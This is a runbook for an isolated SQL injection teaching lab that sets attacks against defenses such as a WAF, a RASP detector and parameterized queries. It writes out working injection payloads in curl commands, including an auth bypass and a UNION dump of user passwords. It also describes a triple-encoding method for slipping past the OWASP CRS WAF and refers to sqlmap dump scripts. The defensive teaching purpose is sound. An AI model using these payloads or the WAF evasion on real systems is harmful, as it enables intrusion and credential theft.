# Cardinal SQLi — Runbook & Experiment Guide

A succinct operator guide: boot the lab, drive the experiments, read the evidence.
For the click-by-click first run, see [`TUTORIAL.md`](TUTORIAL.md); for topology and
image details, the root [`README.md`](../README.md). The taxonomy this lab is built
to demonstrate is [`sqli-reference.pdf`](sqli-reference.pdf) — every experiment below
names the section it exercises.

> **The one claim under test:** a program confuses *data* for *code*. The injectable
> and safe paths share a byte-identical route; only the **parse tree** differs. Each
> defense is tested against the specific *evasion* that is documented to beat it.

---

## 1. Boot

```bash
cd sql-injection
./build-images.sh            # once, or after editing images/*/Dockerfile
kathara lstart --noterminals # ~30s; the DB seeds itself on first boot
./expose-ui.sh               # publish portal :8080 and Locust UI :8089 to the host
```

Sanity check:

```bash
curl -s -o /dev/null -w 'portal %{http_code}\n' http://localhost:8080/login   # 200
```

Tear down: `kathara lclean && docker rm -f cardinal-webapp-ui cardinal-locust-ui`.

---

## 2. The control surface (this is what makes it an experiment)

Every attack surface is one route with a **per-request toggle**, so an attack and its
benign twin traverse the identical path — the only difference is the toggle value. The
benign Locust client sets the same parameters, so nothing in the request body reveals
intent. Defaults are the *vulnerable* setting (that is the point of the testbed); a
whole run can be pinned with the matching env var (`SQL_IMPL`, `XSS_ENCODING`, …).

| Toggle (query arg) | Values | What it selects | Reference §|
|---|---|---|---|
| `?impl=` | `concat` (default) · `param` · `proc` | SQL path: string-built vs bound vs stored-proc dynamic SQL | 2.1 |
| `?impl=gbk` | — | charset-confusion sink (byte-wise escape under a GBK connection) | 3 (charset confusion) |
| `?serversan=` | `denylist` · `escape` · `allowlist` | Tier-1 input sanitization applied **server-side** | 2.2 |
| `?id=<expr>` | any | numeric-context filter (no quote to escape) | 2.2 limit |
| `?sort=<col>` | any | `ORDER BY` identifier, concatenated even on the param path | 2.1 limit / 3 |
| `?enc=` | `raw` (default) · `escape` | output encoding for reflected/stored values (XSS) | — |
| `?deser=` | `unsafe` (default) · `safe` | object-import reconstruction mode | — |
| `?rasp=` | `off` (default) · `detect` · `block` | RASP structural detector at the DB call: compares the final query to its intended shape | 2.4 |
| `?decode=` | `single` (default) · `double` · `triple` | extra app-side URL decodes (0/1/2 beyond Werkzeug). Must **out-decode** the WAF: CRS normalizes 2 layers, so `triple` is the one that bypasses | 3 (alternate encodings) |
| `?sanitize=` | `on` · `off` | client-side defenses (cookie-persisted) — curl skips these | — |

Routes that reach the DB: `GET /search?q=` and `POST /login` (and their `/api/*`
twins). `GET /profile/<id>` is a parameterized control route. `/myteam` is the
**second-order** sink (reference §1.4 / §2.4 limit).

---

## 3. WAF modes — mind the port

The proxy (`172.30.0.10`) is a live **Coraza + OWASP CRS** WAF (reference §2.3):

| From | URL | Proxy port | Mode |
|---|---|---|---|
| Host browser | `http://localhost:8080` | → `:80` | **enforcing** (blocks, 403) |
| Attacker node | `http://172.30.0.10` | `:80` | **enforcing** (blocks, 403) |
| Attacker node | `http://172.30.0.10:8080` | `:8080` | **detection-only** (logs, forwards) |

So the enforcing WAF is in the attack path by default. To see a payload *succeed
unblocked* (the "before the WAF" baseline), target `:8080`; to see it *blocked*,
target `:80`; the difference between the two is the WAF's contribution. Detections
are written as JSON to `/shared/waf_audit.log`.

> Note: the root README still calls the WAF "deferred" and `advanced_payloads.sh §4`
> says "No WAF in Phase 1" — both are **stale**. The WAF is built and enforcing. CRS
> will now 403 the recognizable payloads on `:80`; that is the whole point of the
> evasion experiments.

---

## 4. Experiment recipes

Run attacker tooling from `kathara connect attacker`. Keep Locust (`:8089`) running
for ambient benign traffic, and `tail -f /captures/http_live.log` on the monitor to
watch attack and benign requests interleave on the same endpoints.

### 4.1 Attack families (reference §1)

```bash
/scripts/manual_payloads.sh     # auth-bypass, UNION, error, time, stacked (baseline)
/scripts/advanced_payloads.sh   # schema enum, boolean/time blind, GROUP_CONCAT dump
/scripts/run_sqli.sh            # sqlmap: find + dump the DB
python3 /scripts/blind_extract.py           # boolean/time blind, char-by-char extraction
```

- **In-band / UNION** and **blind (boolean/time)** → `advanced_payloads.sh`, `blind_extract.py`.
- **Stacked** (§1.2) and **error-based** are *negative results here* (PyMySQL sends one
  statement; the app hides DB errors) — documented, expected, and shown by the scripts.
- **Second-order** (§1.4): store a value via the parameterized profile write, then hit
  `/myteam`, which rebuilds a query from the stored value. Injection fires at *use*, not
  *input*.

### 4.2 Defenses and the evasion that beats each (reference §2–§3)

```bash
/scripts/server_bypass.sh       # Tiers 1-3 server-side defenses, each with its bypass
python3 /scripts/model_bypasses.py  # charset + structural-detector models, with a LIVE differential
```

| Defense (§) | Shown holding | Documented bypass shown |
|---|---|---|
| Parameterized query (2.1) | `?impl=param` neutralizes every value payload | `?sort=` / `?id=` — non-parameterizable positions (§3) |
| Input sanitization (2.2) | allowlist rejects the field | denylist self-nesting (`UNUNIONION`), escape vs numeric context, second-order |
| WAF / CRS (2.3) | `:80` 403s recognizable payloads (incl. **double**-encoding — CRS decodes 2 layers) | **triple**-encoding + `?decode=triple` out-decodes the WAF by one layer (§3) |
| RASP (2.4) | `?rasp=block` 403s any input that added query structure | second-order (`/myteam`) and in-DB dynamic SQL (`impl=proc`) — both uninstrumented by design |
| Least privilege (2.5) | `LOAD_FILE` returns NULL | UNION on in-scope tables still extracts |

### 4.4 RASP structural detector (reference §2.4)

Inspects the final query at the DB call and blocks any input that changed the
query's *structure* vs its intended shape. Test via the **detection port** so the
enforcing WAF doesn't 403 the payload before it reaches the app:

```bash
P=http://172.30.0.10:8080
curl -sG "$P/search" --data-urlencode "q=' OR '1'='1" --data-urlencode rasp=block -o /dev/null -w '%{http_code}\n'  # 403 (blocked)
curl -sG "$P/search" --data-urlencode "q=Alice"       --data-urlencode rasp=block | grep -c /records/           # benign -> rows
curl -sG "$P/search" --data-urlencode "q=' OR '1'='1" --data-urlencode rasp=detect | grep -c /records/          # detect: runs, logged
# Documented misses (RASP slips, by design — see rasp.py): second-order and in-DB SQL
curl -sG "$P/myteam"  --data-urlencode rasp=block            # second-order still injects
curl -sG "$P/search" --data-urlencode "q=zzz' UNION SELECT id,username,password,title,department,bio,status FROM users-- -" --data-urlencode impl=proc --data-urlencode rasp=block  # proc still injects
tail /shared/rasp_audit.log   # JSON verdicts: intended_shape vs final_shape
```

### 4.5 Multi-encoding evasion + composition (reference §3)

```bash
/scripts/encoding_evasion.sh   # plain->single->double (all blocked) -> triple (fires) -> RASP
```

The evasion needs the app to decode **one layer more than the WAF**. Coraza/CRS
normalizes **two** encoding layers (argument parse + `urlDecodeUni`), so plain,
single- and **double**-encoded payloads are all fully revealed and caught by
libinjection (rule **942100** — verify in `/shared/waf_audit.log`). A **triple**-
encoded payload with `?decode=triple` (Werkzeug once + two extra unquotes) survives
the WAF's two decodes as inert `%XX`, slips past, and re-forms at the DB call. The
script encodes every byte so even `UNION`/`SELECT` stay hidden, then adds
`rasp=block`: RASP inspects the decoded query and 403s the payload that beat the WAF
— the composition.

### 4.3 Safe-path control

The decisive comparison: the **same payload**, two toggle values, opposite outcomes.

```bash
P=http://172.30.0.10:8080   # detection port, so the WAF doesn't mask the app's behavior
curl -sG "$P/search" --data-urlencode "q=' OR '1'='1"                 # concat: all rows
curl -sG "$P/search" --data-urlencode "q=' OR '1'='1" --data-urlencode impl=param  # param: 0 rows
```

---

## 5. Where the evidence lands

| Artifact | Node | Path |
|---|---|---|
| Packet captures | `monitor` | `/captures/edge-net_*.pcap`, `/captures/app-net_*.pcap` |
| Live HTTP log | `monitor` | `/captures/http_live.log` |
| DB query log (the structural cut — every statement as the DB received it) | `monitor` / `db` | `/captures/db_query.log`, `/shared/db_query.log` |
| WAF audit (JSON, matched CRS rule IDs) | proxy → shared | `/shared/waf_audit.log` |
| RASP audit (JSON, intended vs final shape) | webapp → shared | `/shared/rasp_audit.log` |
| sqlmap output + dumps | `attacker` | `/tmp/sqlmap-output/`, `/tmp/sqlmap-advanced/` |

Pull captures to the host **before** `lclean` (they live inside the container):

```bash
docker cp "$(docker ps --format '{{.Names}}' | grep _monitor_)":/captures ./pcaps
```

The before/after story for any defense is a three-way read: the request bytes (pcap),
the WAF verdict (`waf_audit.log`), and the final SQL (`db_query.log`). For evasions,
the bytes differ at each layer but the parse tree in `db_query.log` is identical — that
is the measurement.

---

## 6. Credentials & schema quick-reference

- Logins: `alice`/`alicepw`, `bob`/`bobpw`, `carol`/`carolpw` (app DB user: `portal`).
- `directory` search selects **7** columns (`id,name,title,department,email,phone,location`)
  — UNION payloads must supply 7.
- Comment style in the browser: `-- -` (dash space dash); don't use `#` in the URL bar.
